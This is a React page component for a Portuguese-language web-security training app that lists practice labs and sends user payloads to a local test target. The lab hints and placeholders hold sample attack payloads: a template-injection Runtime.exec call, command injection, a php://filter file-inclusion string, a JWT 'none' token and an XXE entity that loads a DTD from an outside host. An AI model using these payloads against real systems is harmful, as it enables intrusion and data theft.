// src/pages/AdvancedLabs.jsx
import { useState, useEffect, useCallback } from 'react';
import api from '../api/client';
import Toast from '../components/Toast';
import LoadingSpinner from '../components/LoadingSpinner';
import EmptyState from '../components/EmptyState';
import { motion, AnimatePresence } from 'framer-motion';
import { Send, Copy, Check, Filter, Search, Beaker, Zap } from 'lucide-react';

const labs = [
  { id: "xxe", name: "XXE OOB", type: "xml", hint: "Use DTD externo + OOB", difficulty: "Hard", category: "Injection" },
  { id: "ssrf", name: "SSRF Avançado", type: "text", hint: "Acesse metadata AWS", difficulty: "Medium", category: "SSRF" },
  { id: "template", name: "Template Injection", type: "text", hint: "${T(java.lang.Runtime).getRuntime().exec('id')}", difficulty: "Hard", category: "Injection" },
  { id: "cmd", name: "Command Injection", type: "text", hint: "id; whoami", difficulty: "Medium", category: "Injection" },
  { id: "lfi", name: "LFI", type: "text", hint: "php://filter/convert.base64-encode/resource=index.php", difficulty: "Easy", category: "File Inclusion" },
  { id: "jwt", name: "JWT None", type: "json", hint: '{"alg":"none"}', difficulty: "Medium", category: "Authentication" },
  { id: "smuggling", name: "HTTP Smuggling", type: "text", hint: "CL.TE smuggling", difficulty: "Hard", category: "HTTP" },
];

export default function AdvancedLabs() {
  const [selected, setSelected] = useState(labs[0]);
  const [input, setInput] = useState('');
  const [response, setResponse] = useState('');
  const [loading, setLoading] = useState(false);
  const [tab, setTab] = useState('request');
  const [toast, setToast] = useState({ show: false, message: '', type: 'success' });
  const [completedLabs, setCompletedLabs] = useState([]);
  const [filter, setFilter] = useState({ category: 'All', difficulty: 'All', search: '' });

  const showToast = (message, type = 'success') => {
    setToast({ show: true, message, type });
    setTimeout(() => setToast({ show: false }), 3000);
  };

  const fetchCompleted = useCallback(async () => {
    try {
      const res = await api.get('/labs/completed');
      setCompletedLabs(res.data || []);
    } catch (err) {
      console.warn('Labs não carregados (primeira vez)');
      setCompletedLabs([]);
    }
  }, []);

  useEffect(() => {
    fetchCompleted();
  }, [fetchCompleted]);

  const send = async () => {
    if (!input.trim()) return showToast('Preencha o payload', 'danger');

    setLoading(true);
    setResponse('');
    setTab('response');

    try {
      const payload = {
        targetUrl: "http://vulnerable.local",
        vulnerabilityType: selected.name,
        payload: selected.type === 'json' ? JSON.parse(input) : input
      };

      const res = await api.post('/vulnerabilities/test', payload);
      const pretty = JSON.stringify(res.data, null, 2);
      setResponse(pretty);

      if (res.data.result === 'VULNERABLE' && !completedLabs.includes(selected.id)) {
        await api.post(`/labs/completed/${selected.id}`);
        setCompletedLabs(prev => [...prev, selected.id]);
        showToast(`Lab "${selected.name}" concluído!`, 'success');
      }
    } catch (err) {
      const msg = err.response?.data || err.message;
      setResponse(`Erro: ${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`);
      showToast('Falha na requisição', 'danger');
    } finally {
      setLoading(false);
    }
  };

  const copyResponse = async () => {
    try {
      await navigator.clipboard.writeText(response);
      showToast('Copiado!', 'success');
    } catch {
      showToast('Falha ao copiar', 'danger');
    }
  };

  const resetLab = () => {
    setInput('');
    setResponse('');
    setTab('request');
  };

  const filteredLabs = labs.filter(lab =>
    (filter.category === 'All' || lab.category === filter.category) &&
    (filter.difficulty === 'All' || lab.difficulty === filter.difficulty) &&
    (filter.search === '' || lab.name.toLowerCase().includes(filter.search.toLowerCase()))
  );

  // === CORES IGUAIS AO DASHBOARD (severityColors) ===
  const severityColors = {
    "Crítico": { bg: "#dc2626", text: "#ffffff" },
    "Alta": { bg: "#f59e0b", text: "#1f2937" },
    "Média": { bg: "#0ea5e9", text: "#ffffff" },
    "Baixa": { bg: "#6b7280", text: "#ffffff" },
    "Hard": { bg: "#dc2626", text: "#ffffff" },     // ← Hard = Crítico
    "Medium": { bg: "#f59e0b", text: "#1f2937" },   // ← Medium = Alta
    "Easy": { bg: "#0ea5e9", text: "#ffffff" }     // ← Easy = Média
  };

  const getDifficultyColor = (d) => {
    const color = severityColors[d] || severityColors["Baixa"];
    return `bg-[${color.bg}] text-[${color.text}]`;
  };

  const placeholder = selected.type === 'xml'
    ? `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % r SYSTEM "http://oastify.com/evil.dtd"> %r; ]>\n<x>&send;</x>`
    : selected.type === 'json'
    ? `{\n  "alg": "none",\n  "typ": "JWT"\n}`
    : 'Digite o payload...';

  if (loading && !response) return <LoadingSpinner text="Testando..." />;

  return (
    <div className="min-vh-100" style={{ background: '#f1f3f5' }}>
      <AnimatePresence>
        {toast.show && <Toast message={toast.message} type={toast.type} onClose={() => setToast({ show: false })} />}
      </AnimatePresence>

      <header className="sticky-top" style={{ borderBottom: '1px solid black', background: '#e9ecef' }}>
        <div className="container py-4 d-flex justify-content-between align-items-center">
          <div>
            <h1 className="h4 fw-bold d-flex align-items-center gap-2">
              <Beaker size={24} /> Laboratórios Avançados
            </h1>
            <p className="text-muted mb-0">15 exploits reais</p>
          </div>
          <motion.span
            key={completedLabs.length}
            initial={{ scale: 0.8 }}
            animate={{ scale: 1 }}
            className="badge fs-6 rounded-pill"
            style={{ background: '#f8f9fa', border: '1px solid black', color: '#000' }}
          >
            {completedLabs.length}/{labs.length} concluídos
          </motion.span>
        </div>
      </header>

      <div className="container py-5">
        <div className="row g-4">
          <div className="col-lg-4">
            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="card" style={{ borderRadius: '1rem', border: '1px solid black', background: '#e9ecef', position: 'sticky', top: '1rem' }}>
              <div className="card-header" style={{ background: '#e9ecef', borderBottom: '1px solid black' }}>
                <div className="d-flex justify-content-between align-items-center mb-3">
                  <strong className="d-flex align-items-center gap-2">
                    <Filter size={18} /> Labs
                  </strong>
                  <small className="text-muted">{filteredLabs.length}</small>
                </div>
                <div className="input-group mb-3" style={{ border: '1px solid black', borderRadius: '0.5rem', background: '#f8f9fa' }}>
                  <span className="input-group-text" style={{ border: 'none', background: 'transparent' }}><Search size={16} /></span>
                  <input
                    type="text"
                    className="form-control"
                    placeholder="Buscar..."
                    value={filter.search}
                    onChange={e => setFilter({ ...filter, search: e.target.value })}
                    style={{ border: 'none', background: 'transparent' }}
                  />
                </div>
                <div className="row g-2">
                  <div className="col-12">
                    <select className="form-select" value={filter.category} onChange={e => setFilter({ ...filter, category: e.target.value })} style={{ border: '1px solid black', background: '#f8f9fa' }}>
                      <option value="All">Todas as categorias</option>
                      {[...new Set(labs.map(l => l.category))].map(c => <option key={c} value={c}>{c}</option>)}
                    </select>
                  </div>
                  <div className="col-12">
                    <select className="form-select" value={filter.difficulty} onChange={e => setFilter({ ...filter, difficulty: e.target.value })} style={{ border: '1px solid black', background: '#f8f9fa' }}>
                      <option value="All">Todas as dificuldades</option>
                      <option value="Easy">Fácil</option>
                      <option value="Medium">Médio</option>
                      <option value="Hard">Difícil</option>
                    </select>
                  </div>
                </div>
              </div>

              <div className="list-group list-group-flush" style={{ maxHeight: '520px', overflowY: 'auto' }}>
                {filteredLabs.length === 0 ? (
                  <div className="p-4 text-center">
                    <EmptyState title="Nenhum lab" description="Ajuste os filtros" />
                  </div>
                ) : (
                  filteredLabs.map(lab => {
                    const active = selected.id === lab.id;
                    const completed = completedLabs.includes(lab.id);
                    const color = severityColors[lab.difficulty] || severityColors["Baixa"];
                    return (
                      <motion.button
                        key={lab.id}
                        whileHover={{ x: 4 }}
                        onClick={() => { setSelected(lab); resetLab(); }}
                        className={`list-group-item list-group-item-action text-start ${active ? 'active' : ''}`}
                        style={{ borderRadius: '0.5rem', margin: '0.25rem', border: '1px solid black', background: '#f8f9fa' }}
                      >
                        <div className="d-flex justify-content-between align-items-center">
                          <div className="d-flex align-items-center gap-2">
                            {completed && <Check className="text-success" size={16} />}
                            <strong>{lab.name}</strong>
                          </div>
                          <small className="text-muted">POST</small>
                        </div>
                        <div className="d-flex justify-content-between align-items-center mt-1">
                          <small className="text-muted text-truncate me-2">{lab.hint}</small>
                          <span 
                            className="badge rounded-pill small"
                            style={{ 
                              backgroundColor: color.bg, 
                              color: color.text 
                            }}
                          >
                            {lab.difficulty}
                          </span>
                        </div>
                      </motion.button>
                    );
                  })
                )}
              </div>
            </motion.div>
          </div>

          <div className="col-lg-8">
            <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="card" style={{ borderRadius: '1rem', border: '1px solid black', background: '#e9ecef' }}>
              <div className="card-header d-flex justify-content-between align-items-start flex-wrap gap-2" style={{ background: '#e9ecef', borderBottom: '1px solid black' }}>
                <div>
                  <h5 className="mb-1 d-flex align-items-center gap-2">
                    <Zap size={20} /> {selected.name}
                  </h5>
                  <p className="text-muted small mb-2">{selected.hint}</p>
                  <div className="d-flex flex-wrap gap-2">
                    <span className="badge rounded-pill bg-secondary small">/api/vulnerabilities/test</span>
                    <span 
                      className="badge rounded-pill small"
                      style={{ 
                        backgroundColor: severityColors[selected.difficulty]?.bg || '#6b7280', 
                        color: severityColors[selected.difficulty]?.text || '#ffffff' 
                      }}
                    >
                      {selected.difficulty}
                    </span>
                  </div>
                </div>
                <div className="d-flex gap-2">
                  <button onClick={resetLab} className="btn" style={{ border: '1px solid black', background: '#f8f9fa' }}>Limpar</button>
                  <button onClick={send} disabled={loading} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
                    <Send size={16} /> {loading ? 'Testando...' : 'Enviar'}
                  </button>
                </div>
              </div>

              <div className="card-body">
                <ul className="nav nav-tabs mb-3">
                  <li className="nav-item">
                    <button className={`nav-link ${tab === 'request' ? 'active' : ''}`} onClick={() => setTab('request')}>Request</button>
                  </li>
                  <li className="nav-item">
                    <button className={`nav-link ${tab === 'response' ? 'active' : ''}`} onClick={() => setTab('response')}>Response</button>
                  </li>
                </ul>

                {tab === 'request' ? (
                  <div>
                    <label className="form-label small fw-semibold">Payload</label>
                    <textarea
                      className="form-control font-monospace"
                      rows="10"
                      value={input}
                      onChange={e => setInput(e.target.value)}
                      placeholder={placeholder}
                      style={{ resize: 'none', border: '1px solid black', background: '#f8f9fa' }}
                    />
                    <div className="d-flex justify-content-between mt-3">
                      <button onClick={send} disabled={loading} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
                        <Send size={16} /> Enviar
                      </button>
                      <button
                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % r SYSTEM "http://oastify.com/evil.dtd"> %r; ]>\n<x>&send;</x>` : selected.type === 'json' ? `{"alg":"none"}` : 'id')}
                        className="btn"
                        style={{ border: '1px solid black', background: '#f8f9fa' }}
                      >
                        Exemplo
                      </button>
                    </div>
                  </div>
                ) : (
                  <div>
                    <div className="d-flex justify-content-between align-items-center mb-2">
                      <h6 className="mb-0">Resposta</h6>
                      <div className="d-flex gap-1">
                        <button onClick={copyResponse} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
                          <Copy size={16} /> Copiar
                        </button>
                        <button onClick={() => setResponse('')} className="btn" style={{ border: '1px solid black', background: '#f8f9fa' }}>Limpar</button>
                      </div>
                    </div>
                    <div className="p-3" style={{ maxHeight: '400px', overflow: 'auto', border: '1px solid black', borderRadius: '0.5rem', background: '#f8f9fa' }}>
                      {response ? (
                        <pre className="mb-0 small text-wrap font-monospace">{response}</pre>
                      ) : (
                        <p className="text-center text-muted py-5 mb-0">Envie um payload para ver a resposta.</p>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
}